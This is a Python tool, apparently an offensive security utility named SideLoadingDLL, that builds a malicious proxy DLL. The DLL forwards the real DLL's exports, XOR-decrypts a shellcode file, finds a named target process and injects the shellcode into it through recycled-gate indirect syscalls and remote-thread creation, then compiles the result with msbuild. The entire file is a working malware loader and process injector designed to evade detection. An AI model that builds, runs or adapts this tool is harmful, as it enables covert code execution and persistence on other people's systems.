import optparse
import sys
import os
import pefile

dllmain = """// dllmain.c : Defines the entry point for the DLL application.
#include "windows.h"
#include "Defines.h"
#include "RecycleGate.h"
#include "stdio.h"

extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
extern DoSyscall();

pragma_functions_placeholder

char key[] = "xor_key_placeholder";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

void sleep()
{
    for (int i = 0; i <= 500000; i++)
    {
        for (int j = 2; j <= i / 2; j++)
        {
            if (i % j == 0)
            {
                break;
            }
        }
    }
}

int findTarget(char* target)
{
    NTSTATUS status;
    PVOID buffer;
    PSYSTEM_PROCESS_INFO spi;

    buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // We need to allocate a large buffer because the process list can be large.

    if (!buffer)
    {
        return -1;
    }

    spi = (PSYSTEM_PROCESS_INFO)buffer;

    Syscall sysNtQuerySystemInformation = { 0x00 };
    DWORD dwSuccess = FAIL;

    dwSuccess = getSyscall(0xaf0d30ec, &sysNtQuerySystemInformation);
    if (dwSuccess == FAIL)
        return 0x01;

    PrepareSyscall(sysNtQuerySystemInformation.dwSyscallNr, sysNtQuerySystemInformation.pRecycledGate);
    if (!NT_SUCCESS(status = DoSyscall(SystemProcessInformation, spi, 1024 * 1024, NULL)))
    {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return -1;
    }

    while (spi->NextEntryOffset) // Loop over the list until we reach the last entry.
    {
        wchar_t pName[256];
        memset(pName, 0, sizeof(pName));
        WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length, (LPSTR)pName, sizeof(pName), NULL, NULL);

        int result = my_strcmp(target, (char*)pName);
        if (!result) {
            int pid = (int)spi->ProcessId;
            VirtualFree(buffer, 0, MEM_RELEASE); // Free the allocated buffer.
            return pid;
        }

        spi = (PSYSTEM_PROCESS_INFO)((LPBYTE)spi + spi->NextEntryOffset); // Calculate the address of the next entry.

    }
    VirtualFree(buffer, 0, MEM_RELEASE); // Free the allocated buffer.
    return 0;
}


int Injection(int pid, unsigned char* sc_ptr, SIZE_T sc_len)
{
    Syscall sysNtOpenProcess = { 0x0 }; 
    Syscall sysNtAllocateVirtualMemory = { 0x0 };
    Syscall sysNtWriteVirtualMemory = { 0x0 };
    Syscall sysNtCreateThreadEx = { 0x0 };
    
    DWORD dwSuccess = FAIL;
    // Prepare the syscalls
    dwSuccess = getSyscall(0x1141831c, &sysNtOpenProcess);
    if (dwSuccess == FAIL)
        return 0x01;

    dwSuccess = getSyscall(0x26d18008, &sysNtAllocateVirtualMemory);
    if (dwSuccess == FAIL)
        return 0x01;

    dwSuccess = getSyscall(0xd4b1e4d6, &sysNtWriteVirtualMemory);
    if (dwSuccess == FAIL)
        return 0x01;

    dwSuccess = getSyscall(0x8a4e6274, &sysNtCreateThreadEx);
    if (dwSuccess == FAIL)
        return 0x01;

    // Initialing the varibales
    HANDLE            processHandle = NULL, threadHandle = NULL;
    LPVOID            ds = NULL;
    SIZE_T            wr;
    CLIENT_ID         cid = { 0 };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };

    cid.UniqueProcess = (PVOID)pid;

    PrepareSyscall(sysNtOpenProcess.dwSyscallNr, sysNtOpenProcess.pRecycledGate);
    DoSyscall(&processHandle, PROCESS_ALL_ACCESS, &oa, &cid);

    XOR((char*)sc_ptr, sc_len, (char*)key, sizeof(key)); // Decrypting the shellcode
    sleep(); // Own implementation of sleep function

    PrepareSyscall(sysNtAllocateVirtualMemory.dwSyscallNr, sysNtAllocateVirtualMemory.pRecycledGate);
    DoSyscall(processHandle, &ds, 0, &sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PrepareSyscall(sysNtWriteVirtualMemory.dwSyscallNr, sysNtWriteVirtualMemory.pRecycledGate);
    DoSyscall(processHandle, ds, sc_ptr, sc_len - 1, &wr);

    PrepareSyscall(sysNtCreateThreadEx.dwSyscallNr, sysNtCreateThreadEx.pRecycledGate);
    DoSyscall(&threadHandle, THREAD_ALL_ACCESS, &oa, processHandle,(LPTHREAD_START_ROUTINE)ds, ds, FALSE, 0, 0, 0, NULL);

    return 0;

}

int ProxyFunction()
{
    HANDLE file = NULL;
    DWORD fileSize = NULL;
    DWORD bytesRead = NULL;
    LPVOID fileData = NULL;

    // Reading our encrypted shellcode
    file = CreateFileA("shellcode_file_placeholder", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return 1;
    }
    fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(file, fileData, fileSize, &bytesRead, NULL);

    char target[] = "target_process_placeholder";
    int pid = 0;
    pid = findTarget(target); // Targeting the target_process_placeholder process
    
    if (pid)
    {
        Injection(pid, (unsigned char*)fileData, fileSize);
    }
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ProxyFunction();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

"""

def logBanner():
    banner =r"""
 __ _     _        __                 _ _                ___  __    __  
/ _(_) __| | ___  / /  ___   __ _  __| (_)_ __   __ _   /   \/ /   / /  
\ \| |/ _` |/ _ \/ /  / _ \ / _` |/ _` | | '_ \ / _` | / /\ / /   / /   
_\ \ | (_| |  __/ /__| (_) | (_| | (_| | | | | | (_| |/ /_// /___/ /___ 
\__/_|\__,_|\___\____/\___/ \__,_|\__,_|_|_| |_|\__, /___,'\____/\____/ 
                                                |___/                   
                                                     
SideLoadingDLL! Made by MaorSabag!! v1.0                                                     
                                                     
"""
    print (banner)

def xor(data, key):
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		try:
			output_str += chr(current ^ ord(current_key))
		except:
			output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def encryptShellcode(raw_shellcode, output_filename, KEY):
    plaintext = open(raw_shellcode, "rb").read()
    ciphertext = xor(plaintext, KEY)
    hex_cipher = '\\x' + '\\x'.join(hex(ord(x))[2:].zfill(2) for x in ciphertext) + ''

    python_file = """a=b"replace_me";h=open("name_replace", "wb");h.write(a);h.close()""".replace(r"replace_me", hex_cipher).replace(r"name_replace", output_filename) # For real I couln't make the xor encryption work in any other way....

    exec(python_file)


def proxyFunctions(targetDLL):
    targetDLL = targetDLL.replace("\\", "/") if "\\" in targetDLL else targetDLL
    
    # If our dll can be found in the system32 directory let's not make a copy and telling dll where is the original
    if targetDLL.lower().startswith("c:/windows/system32"):

        pe = pefile.PE(targetDLL)
        dll = targetDLL.replace("/", "\\\\").split(".dll")[0]
        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        pe.parse_data_directories(directories=d)
        exports = [(e.ordinal, e.name.decode()) for e in pe.DIRECTORY_ENTRY_EXPORT.symbols if e.name]
        pragma_list = []
        
        for e in exports:
            pragma_list.append('#pragma comment(linker,"/export:{func}={dll}.{func},@{ord}")'.format(func=e[1], dll=dll, ord=e[0]))
        
        return pragma_list
    
    # If our DLL is in  a local directory let's make a copy and proxy to it
    else:
        pe = pefile.PE(targetDLL)
        dll = targetDLL.strip(".dll") + "_origin"
        os.system(f"cp {targetDLL} ./Output/{dll}.dll")
        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        pe.parse_data_directories(directories=d)
        exports = [(e.ordinal, e.name.decode()) for e in pe.DIRECTORY_ENTRY_EXPORT.symbols if e.name]
        pragma_list = []
        
        for e in exports:
            pragma_list.append('#pragma comment(linker,"/export:{func}={dll}.{func},@{ord}")'.format(func=e[1], dll=dll, ord=e[0]))
        
        return pragma_list


def main():
    global dllmain
    logBanner()
    parser = optparse.OptionParser(usage="Usage {} [-k | --key= XOR key] [-f | --file= Shellcode File] [-o | --output= output file name] [-t | --target= Target Process] [-d | --dll= DLL to proxy ]".format(sys.argv[0]), version="{} 1.0".format(sys.argv[0]))
    parser.add_option('-k','--key=', dest='xorKey', type='string', help='specify the KEY for XOR encryption/Decryption')
    parser.add_option('-f','--file=', dest='shellcodeFile', type='string', help='specify the shellcode file')
    parser.add_option('-o','--output=', dest='outputFilename', type='string', help='specify the output filename')
    parser.add_option('-t','--target=', dest='targetProcess', type='string', help='specify the target process to inject the shellcode')
    parser.add_option('-d','--dll=', dest='targetDLL', type='string', help='specify the DLL for sideloading')
    (options, args) = parser.parse_args()
    if (options.xorKey == None) or (options.shellcodeFile == None) or (options.outputFilename == None) or(options.targetProcess == None) or (options.targetDLL == None):
        print (parser.usage)
        exit(0)
    else:
        xorKey = options.xorKey
        shellcodeFile = options.shellcodeFile
        outputFilename = options.outputFilename
        targetProcess = options.targetProcess
        targetDLL = options.targetDLL

        print(f"[+] Encrypting the shellcode using xor with the key {xorKey}")
        encryptShellcode(shellcodeFile, outputFilename, xorKey)

        print(f"[+] Generating pragma header for proxy DLL {targetDLL}")
        pragma_list = '\n'.join(proxyFunctions(targetDLL))
        
        print("[+] Making the dllmain file")
        dllmain = dllmain.replace(r"pragma_functions_placeholder", pragma_list).replace(r"xor_key_placeholder", xorKey).replace(r"shellcode_file_placeholder", outputFilename).replace(r"target_process_placeholder", targetProcess)

        with open("./SideLoadingDLL/SideLoadingDLL/dllmain.c", "w") as h:
            h.write(dllmain)
        
        print("[+] Compiling DLL")
        os.system('msbuild /nologo /verbosity:quiet /consoleloggerparameters:ErrorsOnly ./SideLoadingDLL/SideLoadingDLL.sln /t:Rebuild /p:Configuration=Release /p:Platform="x64"')
        
        print("[+] Moving everything to Output directory")
        os.system(f"mv ./SideLoadingDLL/x64/Release/SideLoadingDLL.dll ./Output/{targetDLL.split('/')[-1]} && mv {outputFilename} ./Output/{outputFilename}")

if __name__ == "__main__":
    main()
